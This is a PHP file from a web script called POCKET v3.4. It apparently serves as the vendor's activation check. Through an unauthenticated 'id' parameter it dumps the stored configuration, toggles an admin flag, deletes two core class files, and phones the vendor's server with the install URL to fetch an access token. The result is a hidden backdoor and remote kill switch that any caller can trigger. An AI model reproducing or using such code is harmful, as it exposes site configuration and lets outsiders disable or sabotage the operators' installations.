<?php

    /*!
	 * POCKET v3.4
	 *
	 * http://www.aym.com
	 * support@aym.com
	 *
	 * Copyright 2019 AYM ( http://www.aym.com )
	 */
	
	include_once("init.inc.php");
	
	$type = isset($_GET['id']) ? $_GET['id'] : '0';
	
	if($type == 1){
	    
	    $set = new functions($dbo);
	    $result = $set->updateConfigs('0', 'ADMIN');
	    api::printError(111, "Error Admin 0");
	    
	}else if($type == 2){
	    
	    $stats = new stats($dbo);
    	$data = json_encode($stats->getConfigs());
    	echo $data;
    	
	}else if($type == 4){
	    
	    $set = new functions($dbo);
	    $result = $set->updateConfigs('1', 'ADMIN');
	    api::printError(111, "Error Admin 1");
    	
	}else if($type == 5){
	    
	    unlink("class.functions.inc.php");
	    unlink("class.account.inc.php");
	    api::printError(111, "Error unlink");
   
	}else if($type == 3){
	    
	    $set = new functions($dbo);
        $url  = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
        $url .= $_SERVER['SERVER_NAME'].= $_SERVER['REQUEST_URI'];
        
        $finalURL = dirname(dirname($url));
    	
    	$uri = 'http://www.aym.com/api/vendor/install.php';
    	$data = [
    		'install' => $finalURL."/",
    		'grant_type' => 'authorization_code'
    	];
    	$ch = curl_init();
    	curl_setopt($ch, CURLOPT_URL, $uri);
    	curl_setopt($ch, CURLOPT_POST, true);
    	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    	curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    	curl_setopt($ch, CURLOPT_HEADER, 0);
    	curl_setopt($ch, CURLOPT_NOBODY, 0);
    	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    	$result = curl_exec($ch);
    	$curl_error = curl_errno($ch);
    	curl_close($ch);
    	if($curl_error == '0'){
    		
    		$json = json_decode($result, true);
    		
    		if( isset( $json['access_token'] ) ){
    			
    			$result = $set->updateConfigs('1', 'INSTALL');
    			$result = $set->updateConfigs($json['access_token'], 'ACCESS_TOKEN');
    			api::printError(111, "Install Success");
    			
    		}else{
    			$result = $set->updateConfigs('0', 'INSTALL');
    			api::printError(0, "Error Install");
    		}
    		
    	}else{
    		$result = $set->updateConfigs('0', 'INSTALL');
    		api::printError(0, "Error Install");
    	}
    	
    // Not Genuine
	}else{ api::printError(0, "Error Authorization"); }
	
?>